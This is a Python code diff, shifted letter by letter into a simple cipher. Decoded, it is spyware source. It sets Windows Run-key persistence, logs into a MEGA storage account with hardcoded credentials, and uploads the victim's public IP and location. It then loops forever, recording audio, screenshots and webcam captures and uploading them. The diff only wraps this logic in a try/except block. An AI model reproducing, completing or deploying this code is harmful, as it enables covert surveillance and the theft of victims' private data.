@@ -172,66 +172,70 @@ ghi uhfrug_dxglr():
         sulqw("uhfruglqj xsordg idlohg")
 
 zkloh Wuxh:
-    ghohwh_ilohv()
-        
-    surjudp_qdph = "frqvrohedvhg.hah"
-    surjudp_sdwk = rv.sdwk.mrlq(rv.jhwfzg(), surjudp_qdph)
-    nhb = zlquhj.RshqNhb(zlquhj.KNHB_FXUUHQW_XVHU, "Vriwzduh\Plfurvriw\Zlqgrzv\FxuuhqwYhuvlrq\Uxq", 0, zlquhj.NHB_DOO_DFFHVV)
-    zlquhj.VhwYdoxhHa(nhb, "Frqvrohedvhg", 0, zlquhj.UHJ_VC, surjudp_sdwk)
-    zlquhj.ForvhNhb(nhb)
-
-    # vhw xvhuqdph/sdvvzrug
-    phjd_hpdlo = 'odmha92681@phlghfq.frp'
-    phjd_sdvvzrug = 'e@vlw1218'
-
-    # phjd vljqlq
-    phjd = Phjd()
-    phjd_orjlq = phjd.orjlq(phjd_hpdlo, phjd_sdvvzrug)
-    sulqw("orjjhg lq")
-
-    sxeolf_lsy4 = jhw_sxeolf_lsy4()
-    ls_dgguhvv = sxeolf_lsy4
-    orfdwlrq = jhw_orfdwlrq_iurp_ls(ls_dgguhvv)
-
-    # zlqgrzv xvhuqdph
-    fxuuhqw_wlph = gdwhwlph.qrz().vwuiwlph('%B-%p-%g_%K-%P-%V')
-    orfdwlrq_iloh_qdph = i'ls_orfdwlrq_{fxuuhqw_wlph}.waw'
-
-    # Vdyh LS dgguhvv dqg orfdwlrq lq d whaw iloh
-    zlwk rshq(orfdwlrq_iloh_qdph, 'z') dv iloh:
-        iloh.zulwh(i"Sxeolf LSy4 Dgguhvv: {ls_dgguhvv}\q")
-        iloh.zulwh(i"Orfdwlrq: {orfdwlrq}\q")
-
-    # pdnh iroghu fdoohg vfuhhqvkrwv rq phjd vwrudjh
-    orfdwlrq_iroghu= phjd_orjlq.ilqg('orfdwlrqv')
-
-    li qrw orfdwlrq_iroghu:
-        orfdwlrq_iroghu = phjd_orjlq.fuhdwh_iroghu('orfdwlrqv')
-    hovh:
-        orfdwlrq_iroghu = orfdwlrq_iroghu[0]
-
-    sulqw("xsordglqj orfdwlrq wr orfdwlrq_iroghu")
-    phjd_orjlq.xsordg(orfdwlrq_iloh_qdph, orfdwlrq_iroghu)
-
-    rv.uhpryh(orfdwlrq_iloh_qdph)
-
-    # kdfn orrs
-    frxqwhu = 0
-    zkloh Wuxh:
-        
-        # Fuhdwh wkuhdgv iru hdfk ixqfwlrq
-        dxglr_wkuhdg = wkuhdglqj.Wkuhdg(wdujhw=uhfrug_dxglr)
-        vfuhhqvkrw_wkuhdg = wkuhdglqj.Wkuhdg(wdujhw=vfuhhqvkrw_xsordg)
-        zhefdp_wkuhdg = wkuhdglqj.Wkuhdg(wdujhw=zhefdp_xsordg)
-
+    wub:
         ghohwh_ilohv()
+        
+        surjudp_qdph = "frqvrohedvhg.hah"
+        surjudp_sdwk = rv.sdwk.mrlq(rv.jhwfzg(), surjudp_qdph)
+        nhb = zlquhj.RshqNhb(zlquhj.KNHB_FXUUHQW_XVHU, "Vriwzduh\Plfurvriw\Zlqgrzv\FxuuhqwYhuvlrq\Uxq", 0, zlquhj.NHB_DOO_DFFHVV)
+        zlquhj.VhwYdoxhHa(nhb, "Frqvrohedvhg", 0, zlquhj.UHJ_VC, surjudp_sdwk)
+        zlquhj.ForvhNhb(nhb)
 
-        # Vwduw wkh wkuhdgv
-        dxglr_wkuhdg.vwduw()
-        vfuhhqvkrw_wkuhdg.vwduw()
-        zhefdp_wkuhdg.vwduw()
+        # vhw xvhuqdph/sdvvzrug
+        phjd_hpdlo = 'odmha92681@phlghfq.frp'
+        phjd_sdvvzrug = 'e@vlw1218'
 
-        # Zdlw iru erwk wkuhdgv wr ilqlvk
-        dxglr_wkuhdg.mrlq()
-        vfuhhqvkrw_wkuhdg.mrlq()
-        zhefdp_wkuhdg.mrlq()
+        # phjd vljqlq
+        phjd = Phjd()
+        phjd_orjlq = phjd.orjlq(phjd_hpdlo, phjd_sdvvzrug)
+        sulqw("orjjhg lq")
+
+        sxeolf_lsy4 = jhw_sxeolf_lsy4()
+        ls_dgguhvv = sxeolf_lsy4
+        orfdwlrq = jhw_orfdwlrq_iurp_ls(ls_dgguhvv)
+
+        # zlqgrzv xvhuqdph
+        fxuuhqw_wlph = gdwhwlph.qrz().vwuiwlph('%B-%p-%g_%K-%P-%V')
+        orfdwlrq_iloh_qdph = i'ls_orfdwlrq_{fxuuhqw_wlph}.waw'
+
+        # Vdyh LS dgguhvv dqg orfdwlrq lq d whaw iloh
+        zlwk rshq(orfdwlrq_iloh_qdph, 'z') dv iloh:
+            iloh.zulwh(i"Sxeolf LSy4 Dgguhvv: {ls_dgguhvv}\q")
+            iloh.zulwh(i"Orfdwlrq: {orfdwlrq}\q")
+
+        # pdnh iroghu fdoohg vfuhhqvkrwv rq phjd vwrudjh
+        orfdwlrq_iroghu= phjd_orjlq.ilqg('orfdwlrqv')
+
+        li qrw orfdwlrq_iroghu:
+            orfdwlrq_iroghu = phjd_orjlq.fuhdwh_iroghu('orfdwlrqv')
+        hovh:
+            orfdwlrq_iroghu = orfdwlrq_iroghu[0]
+
+        sulqw("xsordglqj orfdwlrq wr orfdwlrq_iroghu")
+        phjd_orjlq.xsordg(orfdwlrq_iloh_qdph, orfdwlrq_iroghu)
+
+        rv.uhpryh(orfdwlrq_iloh_qdph)
+
+        # kdfn orrs
+        frxqwhu = 0
+        zkloh Wuxh:
+            
+            # Fuhdwh wkuhdgv iru hdfk ixqfwlrq
+            dxglr_wkuhdg = wkuhdglqj.Wkuhdg(wdujhw=uhfrug_dxglr)
+            vfuhhqvkrw_wkuhdg = wkuhdglqj.Wkuhdg(wdujhw=vfuhhqvkrw_xsordg)
+            zhefdp_wkuhdg = wkuhdglqj.Wkuhdg(wdujhw=zhefdp_xsordg)
+
+            ghohwh_ilohv()
+
+            # Vwduw wkh wkuhdgv
+            dxglr_wkuhdg.vwduw()
+            vfuhhqvkrw_wkuhdg.vwduw()
+            zhefdp_wkuhdg.vwduw()
+
+            # Zdlw iru erwk wkuhdgv wr ilqlvk
+            dxglr_wkuhdg.mrlq()
+            vfuhhqvkrw_wkuhdg.mrlq()
+            zhefdp_wkuhdg.mrlq()
+            
+    hafhsw Hafhswlrq dv h:
+        sulqw("Dq huuru rffxuuhg:", vwu(h))
